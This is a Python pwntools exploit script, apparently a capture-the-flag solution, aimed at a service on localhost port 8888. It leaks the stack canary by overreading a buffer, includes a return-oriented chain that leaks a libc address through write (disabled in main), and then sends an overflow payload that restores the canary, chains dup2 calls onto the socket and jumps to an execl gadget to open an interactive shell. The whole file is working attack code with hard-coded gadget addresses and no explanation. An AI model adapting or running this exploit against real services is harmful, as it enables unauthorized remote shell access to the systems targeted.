#-*-coding: utf-8-*-
from pwn import *

fd = 4
canary = 0
execl = 0x08048C62
ret = 0x80485da
popret = 0x80485f1
pop2ret = 0x8048b2d
pop4ret = 0x80495bc
pop3ret = 0x8048b2c
write_plt = 0x080486E0

libc_start_main_got = 0x0804B038

dup2_addr = 0xf75a2000 + 0x000db920

def leak_canary():
    r = remote("127.0.0.1", 8888)
    r.recvuntil(">")
    r.send("4")
    r.recvuntil("(y/n) ")
    
    payload = 'y'*0xb
    r.send(payload)
    leak = r.recv(1024)[22:26]
    global canary                  # must do.
    canary = u32(leak) & 0xffffff00
    print "canary is ", hex(canary)
    
    
def leak_libc():
    r = remote("127.0.0.1", 8888)
    r.recvuntil(">")
    r.send("4")
    r.recvuntil("(y/n) ")
    
    payload = '1'*0xa
    payload += p32(canary)
    payload += p32(0x00000000)
    payload += p32(0x00000000)
    payload += p32(0xffa80000)  # sfp 
    payload += p32(write_plt)   # ret
    payload += p32(pop3ret)
    payload += p32(fd)
    payload += p32(libc_start_main_got)
    payload += p32(8)
    r.send(payload)
    
    libc_addrs = r.recv()
    libc_start_main_addr = u32(libc_addrs[:4])
    print(hex(libc_start_main_addr))
    r.close()
    
    

def exploit():
    r = remote("127.0.0.1", 8888)
    r.recvuntil(">")
    r.send("4")
    r.recvuntil("(y/n) ")
    
    payload = '1'*0xa
    payload += p32(canary)
    payload += p32(0x00000000)
    payload += p32(0x00000000)
    payload += p32(0xffa80000)
    payload += p32(dup2_addr)
    payload += p32(pop2ret)
    payload += p32(fd)
    payload += p32(1)
    payload += p32(dup2_addr)
    payload += p32(pop2ret)
    payload += p32(fd)
    payload += p32(0)
    payload += p32(execl)
    r.send(payload)
    r.interactive()
    
    
if __name__ == "__main__":
    print "========leak canary"
    leak_canary()
    
    # print "========leak libc"
    # leak_libc()
    
    print "========exploit"
    exploit()
    
    